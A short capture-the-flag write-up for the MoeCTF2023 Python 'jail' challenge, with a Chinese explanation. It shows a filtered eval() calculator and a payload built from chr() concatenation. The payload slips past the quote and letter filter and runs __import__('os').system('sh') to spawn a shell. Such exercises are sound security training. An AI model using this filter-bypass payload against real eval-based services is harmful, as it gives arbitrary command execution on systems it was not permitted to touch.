```python
print("Welcome to the MoeCTF2023 Jail challenge.It's time to work on this calc challenge.")
print("Enter your expression and I will evaluate it for you.")
def func_filter(s):
    not_allowed = set('"\'`bid')
    return any(c in not_allowed for c in s)
user_input_data = input("> ")
if func_filter(user_input_data):
    print("Oh hacker! Bye~")
    exit(0)
if not user_input_data.isascii():
    print("Sorry we only ascii for this chall!")
    exit(0)
print('Answer result: {}'.format(eval(user_input_data)))
```

不允许引号，想到使用`chr`生成字符进行拼接，注意需要再加一层`eval`

```python
>>> e
Welcome to the MoeCTF2023 Jail challenge.It's time to work on this calc challenge.
Enter your expression and I will evaluate it for you.
> eval(chr(101)+chr(118)+chr(97)+chr(108)+chr(40)+chr(39)+chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(34)+chr(111)+chr(115)+chr(34)+chr(41)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(34)+chr(115)+chr(104)+chr(34)+chr(41)+chr(39)+chr(41))
# eval(\'__import__("os").system("sh")\')
```
